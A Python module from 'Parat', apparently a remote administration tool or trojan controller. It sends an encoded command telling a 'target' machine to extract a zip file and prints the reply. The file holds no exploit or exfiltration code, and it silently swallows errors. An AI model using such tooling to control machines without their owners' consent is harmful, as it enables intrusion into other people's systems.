#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

import argparse
from lib.ParatPrint import colorize, pprint, gray
from lib.ParatEncrypt import Encode, Decode

class ParatZipUtils:

    def __init__(self, conn, args, colors):

        self.help_switch  = ["--help", "-h"]
        self.conn         = conn
        self.args         = args
        self.colors       = colors
        self.handlerTxt   = "#DATA_HANDLER"


    def prepare_basics(self):

        self.parser = argparse.ArgumentParser(
            prog         = "modules.ZipUtil",
            usage        = "pzip -f FILE.zip [-p/--passwd PASSWORD]",
            description  = "small command for extract zip files"
        )

        self.parser.add_argument(
            '-f', '--file',
            required  = True,
            help      = "path to zipped file on target disk"
        )
        self.parser.add_argument(
            '-p', '--passwd',
            default   = "`_._`",
            help      = "zipped file password(if it has)"
        )



    def start(self):

        if self.args is None or len(self.args) == 0 or self.args[0] in self.handlerTxt:
            self.parser.print_help()

        else:

            try:
                argument = self.parser.parse_args(self.args)

                final_command = "pzip<#>{}<#>{}".format(argument.file, argument.passwd)
                self.conn.send(Encode(final_command))

                response = Decode(self.conn.recv(4096))
                pprint(response) if self.colors else pprint(gray(response))

            except:
                pass
